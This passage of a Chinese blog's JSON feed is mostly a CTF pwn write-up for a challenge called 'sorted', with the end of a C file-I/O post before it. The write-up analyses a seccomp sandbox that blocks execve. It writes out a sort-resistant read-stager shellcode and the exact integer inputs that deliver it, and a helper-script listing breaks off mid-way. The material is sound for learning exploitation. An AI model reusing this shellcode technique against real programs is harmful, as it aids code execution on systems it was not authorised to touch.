class=\"built_in\">stdout</span>);</span><br><span class=\"line\">                fclose(fp);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">   \t<span class=\"keyword\">if</span> (ferror(<span class=\"built_in\">stdout</span>))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>,<span class=\"string\">&quot;%s: error writing stdout\\n&quot;</span>, prog);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">2</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 将文件ifp复制到文件ofp</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">filecopy</span><span class=\"params\">(FILE *ifp,FILE *ofp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> c;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>( (c = getc(ifp))!=EOF)</span><br><span class=\"line\">        putc(c,ofp);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"7-7-行输入和行输出\"><a href=\"#7-7-行输入和行输出\" class=\"headerlink\" title=\"7.7 行输入和行输出\"></a>7.7 行输入和行输出</h2><h2 id=\"7-8-特别有用的函数-更详细的在附录b中\"><a href=\"#7-8-特别有用的函数-更详细的在附录b中\" class=\"headerlink\" title=\"7.8 特别有用的函数(更详细的在附录b中)\"></a>7.8 特别有用的函数(更详细的在附录b中)</h2><p>EOF与空白符号的区别</p>\n<p>这是空白符号, EOF是-1</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; &#x27;</span>     (<span class=\"number\">0x20</span>)\tspace (SPC) 空格符</span><br><span class=\"line\"><span class=\"string\">&#x27;\\t&#x27;</span>\t(<span class=\"number\">0x09</span>)\thorizontal <span class=\"title function_\">tab</span> <span class=\"params\">(TAB)</span> 水平制表符\t</span><br><span class=\"line\">&#x27;\\n&#x27;\t<span class=\"params\">(<span class=\"number\">0x0a</span>)</span>\t<span class=\"title function_\">newline</span> <span class=\"params\">(LF)</span> 换行符</span><br><span class=\"line\">&#x27;\\v&#x27;\t<span class=\"params\">(<span class=\"number\">0x0b</span>)</span>\tvertical <span class=\"title function_\">tab</span> <span class=\"params\">(VT)</span> 垂直制表符</span><br><span class=\"line\">&#x27;\\f&#x27;\t<span class=\"params\">(<span class=\"number\">0x0c</span>)</span>\t<span class=\"title function_\">feed</span> <span class=\"params\">(FF)</span> 换页符</span><br><span class=\"line\">&#x27;\\r&#x27;\t<span class=\"params\">(<span class=\"number\">0x0d</span>)</span>\tcarriage <span class=\"title function_\">return</span> <span class=\"params\">(CR)</span> 回车符</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tFILE *fp;</span><br><span class=\"line\">\t<span class=\"type\">int</span> c;</span><br><span class=\"line\"></span><br><span class=\"line\">    fp = fopen(<span class=\"string\">&quot;./flag&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">\t<span class=\"comment\">//write(1,fp,20);</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tc = fgetc(fp);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(feof(fp)) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>,c);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfclose(fp);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n",
            "tags": [
                "C语言"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-45-10%E6%9C%88%E6%9C%88%E8%B5%9B%E4%B8%A4%E9%A2%98/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-45-10%E6%9C%88%E6%9C%88%E8%B5%9B%E4%B8%A4%E9%A2%98/",
            "title": "pwn入门-45-10月月赛两题",
            "date_published": "2023-10-30T13:15:56.000Z",
            "content_html": "<p>题目文件: 本链接+.&#x2F;sorted  .&#x2F;ezpwn</p>\n<p>总结下来就是基础太不牢固了，很多小点都不清楚，浪费时间，每次遇到后都要尽量及时解决，查缺补漏。</p>\n<h1 id=\"sorted\"><a href=\"#sorted\" class=\"headerlink\" title=\"sorted\"></a>sorted</h1><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+0h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> j; <span class=\"comment\">// [rsp+4h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *dest; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  sandbox();</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Just give you ten seconds before you DIE!&quot;</span>);</span><br><span class=\"line\">  dest = mmap(<span class=\"number\">0LL</span>, <span class=\"number\">0x1000</span>uLL, <span class=\"number\">7</span>, <span class=\"number\">34</span>, <span class=\"number\">-1</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">10</span>; i &gt; <span class=\"number\">0</span>; --i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d!\\n&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)i);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>, &amp;DIEnum[i]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Before you die,I must do something.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::sort&lt;<span class=\"type\">int</span> *&gt;(&amp;unk_203044, &amp;unk_20306C);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;let&#x27;s see what&#x27;U have said&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( j = <span class=\"number\">1</span>; j &lt;= <span class=\"number\">10</span>; ++j )</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, DIEnum[j]);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Hahahahahaha!Now,taste the fear&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">memcpy</span>(dest, DIEnum, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">  ((<span class=\"type\">void</span> (*)(<span class=\"type\">void</span>))dest)();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;linux/seccomp.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;linux/filter.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> DIEnum[<span class=\"number\">20</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">sandbox</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sock_filter</span> <span class=\"title\">filter</span>[] =</span> &#123;</span><br><span class=\"line\">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class=\"number\">4</span>),</span><br><span class=\"line\">    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class=\"number\">0xc000003e</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>),</span><br><span class=\"line\">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class=\"number\">0</span>),</span><br><span class=\"line\">    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class=\"number\">59</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>),</span><br><span class=\"line\">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span><br><span class=\"line\">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sock_fprog</span> <span class=\"title\">prog</span> =</span> &#123;</span><br><span class=\"line\">    .len = (<span class=\"type\">unsigned</span> <span class=\"type\">short</span>)(<span class=\"keyword\">sizeof</span>(filter)/<span class=\"keyword\">sizeof</span>(filter[<span class=\"number\">0</span>])),</span><br><span class=\"line\">    .filter = filter,</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    prctl(PR_SET_NO_NEW_PRIVS,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  sandbox();</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Just give you ten seconds before you DIE!&quot;</span>);</span><br><span class=\"line\">  <span class=\"type\">char</span>* v1=(<span class=\"type\">char</span> *)mmap(<span class=\"number\">0</span>,<span class=\"number\">0x1000</span>,<span class=\"number\">7</span>,<span class=\"number\">34</span>,<span class=\"number\">-1</span>,<span class=\"number\">0ll</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">10</span>;i&gt;=<span class=\"number\">1</span>;--i)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d!\\n&quot;</span>,i);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;DIEnum[i]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Before you die,I must do something.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::sort(DIEnum+<span class=\"number\">1</span>,DIEnum+<span class=\"number\">11</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;let&#x27;s see what&#x27;U have said&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=<span class=\"number\">10</span>;++i)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,DIEnum[i]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Hahahahahaha!Now,taste the fear&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">memcpy</span>(v1,DIEnum,<span class=\"number\">0x100</span>);</span><br><span class=\"line\">  ((<span class=\"type\">void</span> (*) (<span class=\"type\">void</span>)) v1)();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"题目分析\"><a href=\"#题目分析\" class=\"headerlink\" title=\"题目分析\"></a>题目分析</h2><p>​\t\t打眼一看就发现是一个排序，但是由于自己对端续、有符号数、内存值等一些概念不清楚、晕乎了很常见。</p>\n<p>​\t\t首先这道题并不是要找一个最小化的shellcode，直接拿shell（应该是可以绕过的把，），<strong>因为排序的因素，直接拿shell排序会比较难，不如先read进来，没限制了，再干其他的。</strong></p>\n<h3 id=\"沙箱\"><a href=\"#沙箱\" class=\"headerlink\" title=\"沙箱\"></a>沙箱</h3><p>​\t有沙箱保护 seccomp-tools dump .&#x2F;rop</p>\n<p>execve类似的还有吧    execveat</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> <span class=\"number\">0000</span>: <span class=\"number\">0x20</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000004</span>  A = arch</span><br><span class=\"line\"> <span class=\"number\">0001</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x02</span> <span class=\"number\">0xc000003e</span>  <span class=\"keyword\">if</span> (A != ARCH_X86_64) <span class=\"keyword\">goto</span> <span class=\"number\">0004</span></span><br><span class=\"line\"> <span class=\"number\">0002</span>: <span class=\"number\">0x20</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  A = sys_number</span><br><span class=\"line\"> <span class=\"number\">0003</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x01</span> <span class=\"number\">0x0000003b</span>  <span class=\"keyword\">if</span> (A != execve) <span class=\"keyword\">goto</span> <span class=\"number\">0005</span></span><br><span class=\"line\"> <span class=\"number\">0004</span>: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  <span class=\"keyword\">return</span> KILL</span><br><span class=\"line\"> <span class=\"number\">0005</span>: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x7fff0000</span>  <span class=\"keyword\">return</span> ALLOW</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p> if (A &gt;&#x3D; 0x40000000) goto 0006 没有这个哦</p>\n<p><a href=\"https://www.anquanke.com/post/id/219077\">https://www.anquanke.com/post/id/219077</a></p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-45-10%E6%9C%88%E6%9C%88%E8%B5%9B%E4%B8%A4%E9%A2%98/image-20231028123924865.png\" alt=\"image-20231028123924865\" style=\"zoom:50%;\">\n\n\n\n\n\n<p><a href=\"http://shell-storm.org/shellcode/files/shellcode-905.html\">http://shell-storm.org/shellcode/files/shellcode-905.html</a></p>\n<p>​\t这里有一个比较短的execveat的shellcode，<font color=\"red\">但是，仍然比较难排序，因为指令太多了，而且有个长指令必须连起来</font></p>\n<p>如果不绕过的话就 orw了</p>\n<h3 id=\"对-void-void-dest-的理解\"><a href=\"#对-void-void-dest-的理解\" class=\"headerlink\" title=\"对 ((void (*)(void))dest)()的理解\"></a>对 ((void (*)(void))dest)()的理解</h3><p>dest怎么理解呢，（还好要到了原题，不然。。也可以自己再写一遍的。。都问题不大，多动手！）</p>\n<p>​\t其实就是存放的shellcode的地址，然后当成函数，直接调用这个位置的指令，（就是函数指针）</p>\n<p>​\t((void (*)(void))dest)() ， 将dest转换为一个函数指针 ，函数不带参数，且无返回值</p>\n<p>call  rax, 然后就可以执行shellcode吗</p>\n<p>​\trax里存放的是shellcode那里的起始地址，<strong>也就是将要执行的指令的地址</strong>，call会做两件事，一件是把当前的下一条指令压栈，另外一件是把rax指向的地址赋值给rip（类似于jmp）</p>\n<h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>​\t长度还有限制，<strong>所以应该是先通过一个read片段，把后续代码读入mmap的空间（不会受排序影响），然后再跳转过去即可。</strong></p>\n<p>​\t<font color=\"red\">注意可以利用的信息,rdi存储着mmap的地址,可以利用</font></p>\n<p>​\t这里有个细节，读入的地址不要和要执行的jmp重合， 很容易覆盖到jmp那里,影响指令，所以需要往后写，比如rdi+0x100</p>\n<h3 id=\"shellcode-排序\"><a href=\"#shellcode-排序\" class=\"headerlink\" title=\"shellcode 排序\"></a>shellcode 排序</h3><p>64位系统调用规则: rax是系统调用号，参数和函数的一样，rdi、rsi、rdx。。</p>\n<p>00也会被解释的，所以需要补齐，用0x90 nop  0xfc cld这种指令,并且可以利用他们来调整顺序</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">read(<span class=\"number\">0</span>,buf,<span class=\"number\">0x100</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">48</span> <span class=\"number\">8b</span> df        mov rbx,rdi <span class=\"comment\">//把要写的地址传给rbx（因为rbx在其他地方用不到）</span></span><br><span class=\"line\"><span class=\"number\">31</span> d2           xor edx,edx <span class=\"comment\">//为什么不是rdx呢</span></span><br><span class=\"line\">b6 <span class=\"number\">01</span>           mov dh,<span class=\"number\">0x1</span>   <span class=\"comment\">//一方面设置第三个参数 0x100，也就是read的大小，</span></span><br><span class=\"line\"><span class=\"number\">48</span> <span class=\"number\">01</span> d3        add rbx,rdx <span class=\"comment\">//另一方面可以让rbx+0x100，</span></span><br><span class=\"line\"><span class=\"number\">31</span> C0           xor eax,eax  <span class=\"comment\">//为什么不是rax,  read系统调用号是0</span></span><br><span class=\"line\"><span class=\"number\">31</span> ff           xor edi,edi  <span class=\"comment\">// 第一个参数0 ，标准输入</span></span><br><span class=\"line\"><span class=\"number\">48</span> <span class=\"number\">89</span> de        mov rsi,rbx <span class=\"comment\">//第二个参数，buf地址</span></span><br><span class=\"line\"><span class=\"number\">0f</span> <span class=\"number\">05</span>           syscall</span><br><span class=\"line\">ff e6           jmp rbx <span class=\"comment\">//跳转到后续shellcode地址</span></span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\">所以问什么不</span><br><span class=\"line\"><span class=\"number\">48</span> <span class=\"number\">89</span> fe        mov rsi,rdi <span class=\"comment\">//把要写的地址传给rbx（因为rbx在其他地方用不到）</span></span><br><span class=\"line\"><span class=\"number\">31</span> d2           xor edx,edx</span><br><span class=\"line\">b6 <span class=\"number\">01</span> \t \t\tmov dh,<span class=\"number\">0x1</span>   <span class=\"comment\">//一方面设置rdx为0x100，也就是read的大小，</span></span><br><span class=\"line\"><span class=\"number\">48</span> <span class=\"number\">01</span> d6\t\tadd rsi,rdx <span class=\"comment\">//另一方面可以让rbx+0x100，</span></span><br><span class=\"line\"><span class=\"number\">31</span> C0           xor eax,eax  </span><br><span class=\"line\"><span class=\"number\">31</span> ff           xor edi,edi  <span class=\"comment\">// 第一个参数0 ，标准输入</span></span><br><span class=\"line\"><span class=\"number\">0f</span> <span class=\"number\">05</span>           syscall</span><br><span class=\"line\">ff e6           jmp rsi <span class=\"comment\">//跳转到后续shellcode地址</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">注意字节序是反的</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0xfe8948</span></span><br><span class=\"line\"><span class=\"number\">0xd231</span></span><br><span class=\"line\"><span class=\"number\">0x01b6</span></span><br><span class=\"line\"><span class=\"number\">0xd60148</span></span><br><span class=\"line\"><span class=\"number\">0xc031</span></span><br><span class=\"line\"><span class=\"number\">0xff31</span></span><br><span class=\"line\"><span class=\"number\">0x050f</span></span><br><span class=\"line\"><span class=\"number\">0xe6ff</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">排序有几个注意点</span><br><span class=\"line\"><span class=\"number\">1.</span>负数是自身绝对值越大， 数值越大吗。。(是的把，按位取反加<span class=\"number\">1</span>，看起来越大的值，补码越小，再加符号，越大，)（有空再看看。。</span><br><span class=\"line\"><span class=\"number\">2.</span>谁必须在谁前面  一个<span class=\"number\">90</span>，一个fc就可以保证了</span><br><span class=\"line\"><span class=\"number\">3.</span>syscall和jmp rsi必须在最后（fcfc就可以保证了，其他的最大fc90）</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0x90fe8948</span></span><br><span class=\"line\"><span class=\"number\">0x9090d231</span></span><br><span class=\"line\"><span class=\"number\">0x90fc01b6</span></span><br><span class=\"line\"><span class=\"number\">0xfcd60148</span></span><br><span class=\"line\"><span class=\"number\">0xfc90c031</span></span><br><span class=\"line\"><span class=\"number\">0xfc90ff31</span></span><br><span class=\"line\"><span class=\"number\">0xfcfc050f</span></span><br><span class=\"line\"><span class=\"number\">0xfcfce6ff</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffff</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffff</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">-1869557199</span> <span class=\"number\">-1862532682</span> <span class=\"number\">-1862366904</span> <span class=\"number\">-57622479</span> <span class=\"number\">-57606351</span> <span class=\"number\">-53083832</span> <span class=\"number\">-50592497</span> <span class=\"number\">-50534657</span> <span class=\"number\">2147483647</span> <span class=\"number\">2147483647</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>同学的:</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-45-10%E6%9C%88%E6%9C%88%E8%B5%9B%E4%B8%A4%E9%A2%98/image-20231029143618124.png\" alt=\"image-20231029143618124\" style=\"zoom:50%;\">\n\n\n\n<p>写一个脚本辅助生成(其实就是模拟题目)   <font color=\"red\">这里是不是可以用cap那个工具 显示指令(埋个坑吧)、以及连起来更多的,一键生成exp</font></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> DIEnum[<span class=\"number\">20</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;10&quot;</span>);</span><br><span class=\"line\">    <span class=\"type\">char</span>* v1=(<span class=\"type\">char</span> *)<span class=\"built_in\">mmap</span>(<span class=\"number\">0</span>,<span class=\"number\">0x1000</span>,<span 